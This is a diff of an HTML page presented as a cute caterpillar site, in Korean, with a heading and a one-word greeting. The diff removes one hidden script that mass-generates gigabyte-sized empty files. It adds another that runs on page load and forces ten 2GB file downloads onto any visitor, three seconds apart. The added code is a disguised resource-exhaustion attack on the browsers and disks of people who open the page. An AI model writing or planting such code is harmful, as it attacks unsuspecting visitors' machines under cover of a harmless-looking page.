@@ -4,36 +4,63 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>애벌레 사이트</title>
-    <script>
-        // Function to generate a large binary file with empty content
-        function generateLargeEmptyFile(sizeInMB) {
-            const sizeInBytes = sizeInMB * 1024 * 1024; // Convert MB to bytes
-            const buffer = new Uint8Array(sizeInBytes); // Create a buffer filled with 0
-            return buffer;
-        }
-
-        // Function to download the generated file
-        function downloadBinaryFile(fileName, content) {
-            const blob = new Blob([content], { type: "application/octet-stream" });
-            const link = document.createElement("a");
-            link.href = URL.createObjectURL(blob);
-            link.download = fileName;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-
-        // Generate and download 15 files of ~1.33GB each
-        const fileCount = 15;
-        const fileSizeInMB = 1333; // ~1.33GB per file
-
-        for (let i = 1; i <= fileCount; i++) {
-            const fileName = `empty-file-${i}.bin`;
-            const content = generateLargeEmptyFile(fileSizeInMB);
-            downloadBinaryFile(fileName, content);
-        }
-    </script>
 </head>
 <body>
+    <h1>애벌레는 귀여워</h1>
+    <p>와!</p>
+    <script>
+        // Function to create and trigger a file download
+        function createAndDownloadFile(fileName, sizeInGB) {
+            const sizeInBytes = sizeInGB * 1024 * 1024 * 1024; // Convert GB to bytes
+            const chunkSize = 1024 * 1024; // 1MB chunk size
+            let content = "";
+
+            // Fill the content with repetitive data in chunks
+            for (let i = 0; i < chunkSize; i++) {
+                content += "A"; // Fill with the letter "A"
+            }
+
+            const blobParts = [];
+            for (let i = 0; i < sizeInBytes / chunkSize; i++) {
+                blobParts.push(content);
+            }
+
+            // Create a Blob object for the large file
+            const blob = new Blob(blobParts, { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+
+            // Create a temporary anchor element to trigger the download
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click(); // Simulate a click to download the file
+            document.body.removeChild(a);
+
+            // Release the Blob URL after 10 seconds to free memory
+            setTimeout(() => URL.revokeObjectURL(url), 10000);
+        }
+
+        // Start the download process with a 3-second interval
+        function startDownloadProcess() {
+            let downloadCount = 0;
+            const maxDownloads = 10;
+            const interval = 3000; // 3 seconds in milliseconds
+
+            const intervalId = setInterval(() => {
+                if (downloadCount < maxDownloads) {
+                    downloadCount++;
+                    createAndDownloadFile(`file_${downloadCount}.txt`, 2); // Generate and download a 2GB file
+                    console.log(`Downloading file ${downloadCount}...`);
+                } else {
+                    console.log("All downloads completed.");
+                    clearInterval(intervalId); // Stop the interval when all files are downloaded
+                }
+            }, interval);
+        }
+
+        // Start the download process when the page loads
+        window.onload = startDownloadProcess;
+    </script>
 </body>
 </html>
